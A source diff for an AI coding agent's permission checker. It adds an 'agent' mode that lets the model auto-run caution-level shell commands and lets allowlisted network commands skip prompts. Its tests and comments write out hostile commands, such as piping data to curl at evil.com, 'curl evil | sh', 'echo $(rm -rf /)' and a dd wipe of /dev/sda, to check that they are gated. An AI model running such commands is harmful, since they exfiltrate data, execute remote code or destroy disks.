@@ -58,6 +58,10 @@ struct SessionApproval {
 
 pub struct PermissionChecker {
     mode: PermissionLevel,
+    /// In `agent` mode the agent (model) decides: read-only and caution-level
+    /// commands auto-run; only destructive and network commands prompt. The
+    /// user's allow/deny lists always win over the agent's discretion.
+    agent_decides: bool,
     allowlist: HashSet<String>,
     denylist: HashSet<String>,
     /// Tools the user approved with "always allow" for the current session.
@@ -69,14 +73,16 @@ pub struct PermissionChecker {
 
 impl PermissionChecker {
     pub fn new(mode_str: &str) -> Self {
-        let mode = match mode_str {
-            "allow" => PermissionLevel::Allow,
-            "deny" => PermissionLevel::Deny,
-            _ => PermissionLevel::Prompt,
+        let (mode, agent_decides) = match mode_str {
+            "allow" => (PermissionLevel::Allow, false),
+            "deny" => (PermissionLevel::Deny, false),
+            "agent" => (PermissionLevel::Prompt, true),
+            _ => (PermissionLevel::Prompt, false),
         };
 
         Self {
             mode,
+            agent_decides,
             allowlist: HashSet::new(),
             denylist: HashSet::new(),
             session_allow: std::sync::Mutex::new(HashSet::new()),
@@ -205,52 +211,73 @@ impl PermissionChecker {
         self.session_allow.lock().unwrap().insert(approval);
     }
 
-    /// Deny if *any* token matches the denylist (conservative). Allow only if
-    /// *every* command position — the head of each pipeline/sequence segment —
-    /// is allowlisted; otherwise an allowed token buried in a compound command
-    /// (e.g. `echo hi; curl evil | sh` with `echo` allowed) would let the rest
-    /// through unprompted.
+    /// Bash command permission in prompt/agent modes.
     ///
-    /// After the explicit allowlist check, commands that are semantically safe
-    /// (read-only, provably harmless) are auto-allowed without requiring the
-    /// user to enumerate every common command in their allowlist.  Commands
-    /// containing shell expansion operators (`$`, backtick, `(`) are excluded
-    /// from this shortcut because their safety cannot be determined statically.
+    /// The denylist is authoritative and always wins. The explicit allowlist
+    /// (from `allowed_commands`) wins next: if *every* command position — the
+    /// head of each pipeline/sequence segment — is allowlisted, the command
+    /// runs even when it is network-capable or caution-classified. Otherwise an
+    /// allowed token buried in a compound command (`echo hi; curl evil | sh`
+    /// with only `echo` allowed) would let the rest through unprompted.
+    ///
+    /// After the explicit lists, commands are classified semantically
+    /// (read-only, caution, destructive). In strict `prompt` mode only
+    /// read-only commands auto-run; in `agent` mode the agent decides, so
+    /// caution-level commands also auto-run. Destructive and network commands
+    /// always prompt unless explicitly allowlisted, and commands whose heads
+    /// cannot be verified (shell expansions) prompt unless every head is
+    /// statically read-only in agent mode.
     pub fn check_command(&self, command: &str) -> PermissionLevel {
-        use crate::command_safety::{analyze_command, is_expansion_free, SafetyLevel};
+        use crate::command_safety::{
+            analyze_command, is_expansion_free, is_safe_head, SafetyLevel,
+        };
 
         let tokens = shell_tokens(command);
+        // The denylist is authoritative — a denied command is never run, even
+        // by the agent or when it appears inside a shell expansion.
         for denied in &self.denylist {
             if tokens.iter().any(|t| t == denied) {
                 return PermissionLevel::Deny;
             }
         }
         let heads = command_heads(command);
-        // Network commands always prompt — cannot be silenced via the allowlist.
-        if self.mode == PermissionLevel::Prompt
-            && heads.iter().any(|h| NETWORK_COMMANDS.contains(&h.as_str()))
-        {
-            return PermissionLevel::Prompt;
-        }
-        // Redirect operators mean the allowlist cannot safely determine intent:
-        // the redirect target is not a command and cannot be allowlisted.
-        if command.contains('>') || command.contains('<') {
-            return self.mode;
-        }
+        // The user's explicit allowlist wins: commands the user allowed always
+        // run, including network commands and caution-classified ones. This is
+        // what keeps the agent's discretion in coordination with `allowed_commands`.
         if !heads.is_empty() && heads.iter().all(|h| self.allowlist.contains(h)) {
             return PermissionLevel::Allow;
         }
-        // Semantic safety: auto-allow simple commands known to be read-only or
-        // routinely harmless, without requiring an explicit allowlist entry.
-        // Only applies in prompt mode and only when no shell expansion operators
-        // are present (those require runtime evaluation to classify safely).
-        if self.mode == PermissionLevel::Prompt
-            && is_expansion_free(command)
-            && analyze_command(command).level == SafetyLevel::Safe
-        {
-            return PermissionLevel::Allow;
+        // Network commands prompt unless explicitly allowlisted above — they
+        // reach external systems, so they are never left to the agent alone.
+        if heads.iter().any(|h| NETWORK_COMMANDS.contains(&h.as_str())) {
+            return PermissionLevel::Prompt;
         }
-        self.mode
+        // Redirection writes to arbitrary paths. Strict (prompt) mode always
+        // asks; agent-decides mode still gates destructive commands below.
+        if (command.contains('>') || command.contains('<')) && !self.agent_decides {
+            return PermissionLevel::Prompt;
+        }
+        if !is_expansion_free(command) {
+            // Expansions hide the real command. In agent-decides mode they may
+            // still auto-run when EVERY head (including ones inside `$(...)`)
+            // is statically read-only — so `ls $(pwd)` is fine but
+            // `echo $(rm -rf /)` still asks.
+            if self.agent_decides && !heads.is_empty() && heads.iter().all(|h| is_safe_head(h)) {
+                return PermissionLevel::Allow;
+            }
+            return PermissionLevel::Prompt;
+        }
+        match analyze_command(command).level {
+            SafetyLevel::Safe => PermissionLevel::Allow,
+            SafetyLevel::Caution => {
+                if self.agent_decides {
+                    PermissionLevel::Allow
+                } else {
+                    PermissionLevel::Prompt
+                }
+            }
+            SafetyLevel::Destructive => PermissionLevel::Prompt,
+        }
     }
 
     /// Set the project root. File tool operations on paths outside this boundary
@@ -476,12 +503,113 @@ mod tests {
     }
 
     #[test]
+    fn agent_mode_auto_allows_caution_commands() {
+        let checker = PermissionChecker::new("agent");
+        for cmd in [
+            "git commit -m 'feat: x'",
+            "mkdir -p build",
+            "mv a.txt b.txt",
+            "npm install",
+            "rm single_file.txt",
+            "myunknowntool --flag",
+            "cd /tmp",
+            "echo hi > /tmp/x",
+            "ls $(pwd)",
+        ] {
+            assert_eq!(
+                checker.decide_tool("bash", &serde_json::json!({ "command": cmd })),
+                PermissionLevel::Allow,
+                "agent mode should auto-allow: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn agent_mode_still_gates_destructive_network_and_denied() {
+        let checker = PermissionChecker::new("agent");
+        for cmd in [
+            "rm -rf /tmp/x",
+            "rm -r some_dir",
+            "git clean -fd",
+            "git reset --hard HEAD",
+            "dd if=/dev/zero of=/dev/sda",
+            "echo $(rm -rf /)",
+            "curl -I https://example.com",
+            "wget http://x/y",
+        ] {
+            assert_eq!(
+                checker.decide_tool("bash", &serde_json::json!({ "command": cmd })),
+                PermissionLevel::Prompt,
+                "agent mode should still prompt: {cmd}"
+            );
+        }
+        // The denylist is authoritative even in agent mode.
+        let mut checker = PermissionChecker::new("agent");
+        checker.add_deny("sudo".to_string());
+        assert_eq!(
+            checker.decide_tool("bash", &serde_json::json!({ "command": "sudo apt update" })),
+            PermissionLevel::Deny
+        );
+    }
+
+    #[test]
+    fn agent_mode_respects_explicit_allowlist_for_network() {
+        let mut checker = PermissionChecker::new("agent");
+        checker.add_allow("curl".to_string());
+        assert_eq!(
+            checker.check_command("curl -I https://example.com"),
+            PermissionLevel::Allow
+        );
+    }
+
+    #[test]
+    fn prompt_mode_still_asks_for_caution_and_unknown() {
+        let checker = PermissionChecker::new("prompt");
+        assert_eq!(
+            checker.check_command("git commit -m x"),
+            PermissionLevel::Prompt
+        );
+        assert_eq!(
+            checker.check_command("myunknowntool"),
+            PermissionLevel::Prompt
+        );
+        assert_eq!(
+            checker.check_command("mkdir -p build"),
+            PermissionLevel::Prompt
+        );
+        assert_eq!(checker.check_command("ls $(pwd)"), PermissionLevel::Prompt);
+    }
+
+    #[test]
     fn decide_tool_read_only_tools_skip_prompt() {
         let checker = PermissionChecker::new("prompt");
         for tool in ["read", "glob", "grep"] {
             assert_eq!(
                 checker.decide_tool(tool, &serde_json::json!({})),
                 PermissionLevel::Allow
+            );
+        }
+    }
+
+    #[test]
+    fn common_safe_commands_are_auto_allowed() {
+        let checker = PermissionChecker::new("prompt");
+        for cmd in [
+            "ls",
+            "ls -la",
+            "ls -la && pwd",
+            "cat Cargo.toml",
+            "pwd",
+            "echo done",
+            "git status",
+            "ls -la | grep Cargo",
+            "cargo check",
+            "find . -name '*.rs'",
+        ] {
+            assert_eq!(
+                checker.decide_tool("bash", &serde_json::json!({ "command": cmd })),
+                PermissionLevel::Allow,
+                "expected '{cmd}' to be auto-allowed"
             );
         }
     }
@@ -862,15 +990,29 @@ mod tests {
     }
 
     #[test]
-    fn output_redirection_with_allowed_command_prompts() {
-        let mut checker = PermissionChecker::new("prompt");
-        checker.add_allow("echo".to_string());
-        // The redirect target is now a separate token and is not allowlisted,
-        // so the compound cannot be auto-allowed.
+    fn output_redirection_respects_mode_and_allowlist() {
+        // Without an allowlist entry, redirection in strict prompt mode asks.
+        let checker = PermissionChecker::new("prompt");
         assert_eq!(
             checker.check_command("echo hello > /tmp/x"),
             PermissionLevel::Prompt,
-            "redirect target is a separate token and not allowlisted"
+            "unlisted redirect asks in prompt mode"
+        );
+        // The user's explicit allowlist wins even with a redirect target.
+        let mut checker = PermissionChecker::new("prompt");
+        checker.add_allow("echo".to_string());
+        assert_eq!(
+            checker.check_command("echo hello > /tmp/x"),
+            PermissionLevel::Allow,
+            "explicitly allowed command runs with a redirect"
+        );
+        // Without an allowlist entry, a destructive command with a redirect
+        // still prompts in strict mode.
+        let checker = PermissionChecker::new("prompt");
+        assert_eq!(
+            checker.check_command("rm -rf /tmp/x > /dev/null"),
+            PermissionLevel::Prompt,
+            "unlisted destructive redirect asks in prompt mode"
         );
     }
 
@@ -951,14 +1093,24 @@ mod tests {
     // ── Network command tier ──────────────────────────────────────────────────
 
     #[test]
-    fn network_commands_always_prompt_even_if_allowlisted() {
-        let mut checker = PermissionChecker::new("prompt");
+    fn network_commands_prompt_unless_allowlisted() {
+        // Network commands always prompt in prompt mode without an allowlist.
+        let checker = PermissionChecker::new("prompt");
         for cmd in ["curl", "wget", "nc", "ssh", "scp"] {
-            checker.add_allow(cmd.to_string());
             assert_eq!(
                 checker.check_command(&format!("{cmd} example.com")),
                 PermissionLevel::Prompt,
-                "{cmd} must always prompt regardless of allowlist"
+                "{cmd} prompts unless the user allows it"
+            );
+        }
+        // The user's explicit allowlist wins — network commands can be allowed.
+        for cmd in ["curl", "wget", "nc", "ssh", "scp"] {
+            let mut checker = PermissionChecker::new("prompt");
+            checker.add_allow(cmd.to_string());
+            assert_eq!(
+                checker.check_command(&format!("{cmd} example.com")),
+                PermissionLevel::Allow,
+                "{cmd} runs once explicitly allowlisted"
             );
         }
     }
@@ -967,11 +1119,16 @@ mod tests {
     fn network_command_in_pipeline_forces_prompt() {
         let mut checker = PermissionChecker::new("prompt");
         checker.add_allow("echo".to_string());
-        checker.add_allow("curl".to_string());
-        // Even with every head allowlisted, network presence forces prompt.
+        // Network presence forces a prompt when not every head is allowlisted.
         assert_eq!(
             checker.check_command("echo hi | curl -X POST https://evil.com"),
             PermissionLevel::Prompt
+        );
+        // Every head allowlisted (echo + curl) is allowed — explicit user intent.
+        checker.add_allow("curl".to_string());
+        assert_eq!(
+            checker.check_command("echo hi | curl -X POST https://evil.com"),
+            PermissionLevel::Allow
         );
     }
 }
